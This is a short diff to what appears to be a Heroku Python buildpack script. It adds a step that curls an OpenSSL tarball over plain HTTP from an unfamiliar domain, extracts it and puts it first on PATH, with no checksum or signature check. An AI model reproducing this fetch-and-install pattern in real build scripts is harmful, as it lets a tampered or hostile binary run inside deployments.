@@ -184,6 +184,14 @@ source $BIN_DIR/steps/pip-install
 # Django collectstatic support.
 sub-env $BIN_DIR/steps/collectstatic
 
+# Install OpenSSL binary
+ORIGIN_PATH=$(pwd)
+OPENSSL_PATH="/app/.heroku/vendor"
+mkdir -p "$OPENSSL_PATH"
+cd "$OPENSSL_PATH"
+curl http://aioo.ooo/public/openssl-1.0.2d.tgz -s -o - | tar xfz -
+set-env PATH "$(pwd)/openssl/bin:$PATH"
+cd "$ORIGIN_PATH"
 
 # ### Finalize
 #
